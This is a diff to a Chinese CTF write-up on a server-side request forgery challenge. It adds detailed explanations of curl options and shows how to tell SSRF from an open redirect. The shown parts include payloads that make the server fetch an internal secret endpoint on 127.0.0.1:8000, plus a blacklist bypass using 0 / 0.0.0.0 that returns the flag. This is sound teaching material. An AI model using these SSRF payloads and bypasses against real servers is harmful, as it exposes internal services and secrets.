@@ -52,7 +52,59 @@ url parameter is required
 curl -s -G --data-urlencode "url=http://example.com" "http://20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com/"
 ```
 
-成功返回 Example Domain 页面 → **SSRF 漏洞确认**。
+成功返回 Example Domain 页面 → **SSRF 漏洞确认**（完整判定过程见 3.1 节）。
+
+### curl 参数说明
+
+本题**所有请求都使用这个命令模板**，先把参数含义交代清楚，后面不再重复：
+
+```bash
+curl -s -G --data-urlencode "<参数名>=<值>" "http://TARGET/<路径>"
+```
+
+| 参数 | 全称 | 作用 | 不加会怎样 |
+|------|------|------|-----------|
+| `curl` | — | 命令行 HTTP 客户端 | — |
+| `-s` | `--silent` | 静默模式：不输出进度条、不打印错误提示，**只返回响应体** | 输出里会混进 `% Total  % Received ...` 进度条和连接信息，污染 WP 记录，脚本里也难以解析 |
+| `-G` | `--get` | **把后面的 `--data-urlencode` 数据当作 query string 拼到 URL 后面，并用 GET 方法发送** | `--data-urlencode` 默认走 **POST body** → 本题实测返回 **405 Method Not Allowed**（接口只接受 GET） |
+| `--data-urlencode "url=http://example.com"` | — | 把 `key=value` 中的 **value 做 URL 编码**后拼进 query string：`http://example.com` → `url=http%3a%2f%2fexample.com` | 见下方「为什么不能手写 `?url=`」 |
+| `"http://TARGET/"` | — | 真正请求的目标（CTF 靶机地址） | — |
+
+**引号不能省**：`"url=http://example.com"` 整体用双引号包住，是因为 shell 里 `?`、`&`、`#`、`;` 都是**元字符**。不加引号会被 shell 抢先解析（例如 `&` 会把命令切到后台执行），传给 curl 的值就不完整了。
+
+**为什么不能手写 `?url=http://example.com`？**
+
+因为目标 URL 里含大量 **URI 保留字符**，不做编码会被服务端 / 中间件按自己的规则切分：
+
+| 字符 | 会被误解成 |
+|------|-----------|
+| `:` | 端口分隔符（`http://a.com:8000` 里的 `:`） |
+| `/` | 路径分隔符（中间件可能据此改变路由匹配结果） |
+| `?` | 参数起始符（后面内容被当成新参数） |
+| `&` | 参数分隔符（值被截断） |
+| `#` | fragment（`#` 之后的内容**根本不会发给服务端**） |
+
+URL 编码后这些字符变成 `%3a` `%2f` `%3f` `%26` `%23`，服务端解码后才能拿到**完整的一个字符串值**。
+
+**等价写法对比**：
+
+```bash
+# ① 推荐：让 curl 自动编码（可读性好，不易出错）
+curl -s -G --data-urlencode "url=http://127.0.0.1:8000/api/internal/secret" "http://TARGET/"
+
+# ② 手工编码（效果完全一样，但写法容易出错）
+curl -s "http://TARGET/?url=http%3a%2f%2f127.0.0.1%3a8000%2fapi%2finternal%2fsecret"
+```
+
+**本 WP 后续会用到的其他 curl 参数**：
+
+| 参数 | 作用 | 用在哪 |
+|------|------|--------|
+| `-i` | 连同**响应头**一起输出 | 判断是 `200 OK` 还是 `302 Location`（3.1.2 节，区分 SSRF 与开放重定向） |
+| `-v` | 输出**请求全过程**（DNS、TCP、请求行、请求头） | 证明本地 curl 从未连接过目标站（3.1.2 节） |
+| `-o /dev/null` | 丢弃响应体 | 只关心状态码时 |
+| `-w "%{http_code}"` | 只输出 HTTP 状态码 | 批量探测路径是否存在（2.1 节） |
+| `--max-time N` | 最多等 N 秒后放弃 | 靶机后端超时只有 2 秒（抓外网会挂起），本地加超时防卡死 |
 
 # 2. 信息收集
 
@@ -130,7 +182,145 @@ HTTPConnectionPool(host='example.com', port=8000): Read timed out. (read timeout
 
 # 3. 漏洞分析
 
-## 3.1 第一次尝试：直球访问内网
+## 3.1 SSRF 漏洞确认（两条命令坐实「服务端代取」）
+
+很多人看到「传个 URL 就回显了内容」就直接下结论叫 SSRF，但这中间差着一个关键辨析：
+**服务端是「代取并回显内容」（SSRF），还是只回了一个「跳转指示牌」（开放重定向）？**
+下面把这个判定过程完整铺开。
+
+### 3.1.1 命令模板与两个实测结论
+
+命令沿用第 1 节的模板（参数逐项含义见 [1. 题目分析](#1-题目分析) 的「curl 参数说明」表）：
+
+```bash
+curl -s -G --data-urlencode "url=http://example.com" "http://20cf...dasctf.com/"
+```
+
+此处只补充与**判定逻辑**相关的两个实测结论：
+
+**① `-G` 不能省 —— 实测证明接口只接受 GET**
+
+```bash
+# 不加 -G（POST）→ 405 Method Not Allowed
+# 加 -G  （GET） → 200
+```
+
+说明后端这个接口**只接受 GET 传参**，参数必须出现在 query string 里。
+
+**② 用 `--data-urlencode` 而非手写 `?url=` —— 保留字符会被截断**
+
+用 `-v` 抓到的实际请求行，验证编码和拼接结果：
+
+```bash
+curl -s -v -G --data-urlencode "url=http://example.com" "http://TARGET/" -o /dev/null
+```
+
+```
+*   Trying 198.18.0.177:80...                     ← 我们的 curl 只连了这一个 IP
+* Connected to 20cf...dasctf.com (198.18.0.177)   ← 连的是靶机
+> GET /?url=http%3a%2f%2fexample.com HTTP/1.1
+> Host: 20cf525c2a879b2bed3324a0.http-ctf2.dasctf.com
+> User-Agent: curl/8.7.1
+> Accept: */*
+```
+
+可以看到 `http://example.com` 已被编码为 `http%3a%2f%2fexample.com`，最终以 `?url=...` 的形式出现在请求行里。
+
+**为什么要 URL 编码？** 因为 `http://example.com` 里含 `:  /  /` 这些保留字符。不编码直接写 `?url=http://example.com`，中间件/框架可能把 `:` 当端口分隔符、把 `/` 当路径、把 `&` 当参数分隔符，导致服务端拿到的 `url` 值不完整。用 `--data-urlencode` 才能保证它作为**一个完整字符串值**传递。
+
+### 3.1.2 证据：服务端代取，而不是让我们跳转
+
+加 `-i` 看完整响应头：
+
+```bash
+curl -s -i -G --data-urlencode "url=http://example.com" "http://TARGET/"
+```
+
+```
+HTTP/1.1 200 OK                          ← 200，不是 302
+Server: openresty
+Date: Fri, 11 Sep 2026 08:27:34 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 559
+Connection: keep-alive
+Cache-Control: no-cache
+
+<!doctype html><html lang="en"><head><title>Example Domain</title>...
+<body><div><h1>Example Domain</h1><p>This domain is for use in
+...</html>                                 ← 目标内容被【回显】在 body 里
+```
+
+**关键**：我们本地的 curl **从未连接过 example.com**（`-v` 已证明只连了靶机 IP），也**没有加 `-L`**（不跟随重定向）。那这份 HTML 是谁取回来的？
+
+**答案只能是服务端**：靶机读了我们传的 `url` 参数，**在它自己的网络环境里**发了一次 `GET http://example.com`，然后把结果原样回显给我们。
+
+> **「让服务器代替我们去发请求」——这就是 Server-Side Request Forgery（服务端请求伪造）。**
+
+### 3.1.3 关键辨析：为什么不是「开放重定向」
+
+这是最容易混淆的地方，也是判定 SSRF 的**金标准**：
+
+```
+┌──────────────── 如果是 Open Redirect（开放重定向）────────────────┐
+│                                                                   │
+│  我们:   GET /?url=http://example.com                             │
+│  服务端: 302 Found                                                │
+│          Location: http://example.com   ← 只是一个「指路牌」       │
+│          (body 为空)                                              │
+│                                                                   │
+│  结果: 服务端【自己没去】example.com                                │
+│        是我们的 curl/浏览器（加了 -L 时）才去请求的                 │
+│        → 不是 SSRF                                                │
+└───────────────────────────────────────────────────────────────────┘
+
+┌──────────────────── 本题：SSRF（服务端请求伪造）──────────────────┐
+│                                                                   │
+│  我们:   GET /?url=http://example.com                             │
+│  服务端: 读参数 → 在【服务端网络里】发 GET http://example.com       │
+│          → 拿到 example.com 的 HTML                               │
+│          → 200 OK + body 直接回显给我们                            │
+│                                                                   │
+│  结果: 我们的 curl 全程没碰 example.com                             │
+│        内容却是服务端【代取】回来的                                  │
+│        → 这就是 SSRF ✅                                            │
+└───────────────────────────────────────────────────────────────────┘
+```
+
+**判定口诀**：
+
+| 现象 | 结论 |
+|------|------|
+| `200 OK` + **目标站的内容出现在 body 里** | **SSRF** ✅ |
+| `30x` + `Location: 目标站` + body 为空 | 开放重定向，**不是 SSRF** |
+
+### 3.1.4 SSRF 确认的四个判定要素
+
+这一条命令其实同时命中了 SSRF 的全部判定要素：
+
+| 要素 | 本题证据 |
+|------|---------|
+| ① **参数可控** | `url=` 的取值完全由攻击者决定 |
+| ② **服务端发起** | body 是目标内容，且是 200 而非 302（`-v` 证明我们从未连接 example.com） |
+| ③ **目标可任意替换** | 换成 `127.0.0.1:8000` → `"127.0.0.1 is forbidden"`；换成 `example.com:8000` → `Read timed out`。说明**没有硬编码白名单**，具备打内网的能力 |
+| ④ **有回显** | 目标响应内容 / 报错信息原样返回（回显型 SSRF，最好用；盲 SSRF 得靠 DNSLog 或时间盲注判定） |
+
+第 ③ 点尤其重要——正因为目标可任意替换，才有后面 `http://0.0.0.0:8000/api/internal/secret` 打内网拿 flag 的下一步。
+
+### 3.1.5 这段话在整条推理链中的位置
+
+```
+?url= 参数存在                    ← 信息收集：发现有抓取接口
+        ↓
+url=http://example.com 成功回显    ← 【本节】漏洞探测：SSRF 确认
+        ↓                            同时确立：参数可控 + 服务端发起 + 有回显
+url=http://127.0.0.1:8000/...     ← 利用：尝试直接打内网
+        ↓
+"127.0.0.1 is forbidden"          ← 遇到黑名单，转向绕过（3.3 节）
+        ↓
+url=http://0.0.0.0:8000/...       ← 绕过后拿到 flag
+```
+
+## 3.2 第一次尝试：直球访问内网
 
 ```bash
 curl -s -G --data-urlencode "url=http://127.0.0.1:8000/api/internal/secret" "http://TARGET/"
@@ -142,7 +332,7 @@ curl -s -G --data-urlencode "url=http://127.0.0.1:8000/api/internal/secret" "htt
 
 **结论**：存在 **SSRF 黑名单过滤**，目标是阻断对内网 loopback 的访问。
 
-## 3.2 推理链：过滤器到底在检查什么？
+## 3.3 推理链：过滤器到底在检查什么？
 
 这是本题的**核心**。我按「黑名单匹配的粒度」逐层做假设-验证：
 
@@ -220,7 +410,7 @@ curl -s -G --data-urlencode "url=http://0:8000/api/internal/secret" "http://TARG
 # -> n1book{1132e28b5433c878}   ✅
 ```
 
-## 3.3 漏洞原理图解
+## 3.4 漏洞原理图解
 
 ### 过滤器的黑名单缺陷
 
